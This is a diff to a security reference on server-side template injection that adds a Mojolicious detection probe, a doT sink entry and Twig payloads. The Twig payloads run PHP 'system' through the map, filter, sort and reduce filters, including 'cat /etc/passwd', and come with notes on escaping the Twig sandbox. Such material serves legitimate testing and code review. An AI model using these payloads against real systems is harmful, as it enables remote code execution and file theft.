@@ -36,6 +36,7 @@ Confirm execution with a math probe before escalating to RCE:
 | FreeMarker | `${7*7}` | `49` |
 | Velocity | `#set($x=7*7)${x}` | `49` |
 | Go text/template | `{{printf "%d" (mul 7 7)}}` or `{{7}}` variants | depends on func map |
+| Mojolicious EP (Perl) | `<%= 7*7 %>` | `49` — VULN when `$c->render(inline => $userinput)` (user-controlled inline template) or a user-controlled template name; `<%== %>` is **unescaped** output (also XSS). Embedded Perl in EP templates means SSTI here is direct RCE |
 | Handlebars | `{{#with "s"}}{{/with}}` then gadget chains | engine-specific |
 | Jinja2 (string mult) | `{{7*'7'}}` | `7777777` (distinguishes Jinja2 from Twig) |
 | Thymeleaf | `#{7*7}` | `49` |
@@ -69,7 +70,10 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 **Twig (PHP)**
 ```
 {{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
+{{['id']|map('system')|join(',')}}          # map/filter/sort/reduce take an arbitrary PHP callable as arg
+{{['id',0]|reduce('system')}}   {{['id']|filter('system')|join}}   {{['cat /etc/passwd']|sort('system')}}
 ```
+The `map`/`filter`/`sort`/`reduce` filters accept a **callable argument**, so any one runs an arbitrary PHP function on attacker data — this works even when `_self` / `registerUndefinedFilterCallback` is blocked, and is often the only path that survives a `SandboxExtension` `SecurityPolicy` (flag a policy that allows these filters; `attribute(_self, 'env')` is the sandbox-escape equivalent of bare `_self`).
 
 **ERB (Ruby)**
 ```
@@ -299,7 +303,7 @@ t.Execute(w, map[string]string{"Name": r.URL.Query().Get("name")})
 - **Java**: Velocity `RuntimeServices.evaluate` / `parse`, `VelocityEngine.evaluate` / `mergeTemplate`; FreeMarker `Template` constructors and `StringTemplateLoader.putTemplate`; Pebble `getTemplate` / `getLiteralTemplate` / `Template.fromString`; Jinjava `render` / `renderForResult`; Thymeleaf `ITemplateEngine.process` / `processThrottled`; StringTemplate `new ST(var)`.
 - **Python**: Jinja2 `Template` / `Environment.from_string`, Flask `render_template_string`, Mako `Template`, Django/Bottle/Genshi/Chameleon/Chevron/Airspeed/TRender template constructors.
 - **Ruby**: ERB `ERB.new(var).result`, Liquid `Template.parse(var)`.
-- **JavaScript**: `ejs.render`, `nunjucks.renderString`, `Handlebars.compile` / `Handlebars.precompile`, `pug.render` / `pug.compile`, `_.template`, Swig `swig.render(var)`, Twig.js `twig({ data: var })`; user-controlled *template object* passed to Express `res.render()` on vulnerable engines (`ejs`, `hbs`, `express-handlebars`, `eta`, `squirrelly`, `haml-coffee`, `express-hbs`, `whiskers`).
+- **JavaScript**: `ejs.render`, `nunjucks.renderString`, `Handlebars.compile` / `Handlebars.precompile`, `pug.render` / `pug.compile`, `_.template`, Swig `swig.render(var)`, Twig.js `twig({ data: var })`, **doT `doT.compile(var)` / `doT.template(var)`** (compiles the template string into a `Function` → RCE-by-design); user-controlled *template object* passed to Express `res.render()` on vulnerable engines (`ejs`, `hbs`, `express-handlebars`, `eta`, `squirrelly`, `haml-coffee`, `express-hbs`, `whiskers`, `dot`).
 - **PHP**: Twig `createTemplate`, Smarty `fetch("string:" . $var)`, Laravel `Blade::render($var)` / `View::make($var)` with a non-literal template name.
 - **Go**: `template.New(name).Parse(var)`.
 - **C#/.NET**: Scriban `Template.Parse(var)`, Handlebars.Net `Handlebars.Compile(var)`, DotLiquid `DotLiquid.Template.Parse(var)`, Fluid `FluidParser.TryParse(var, ...)`.
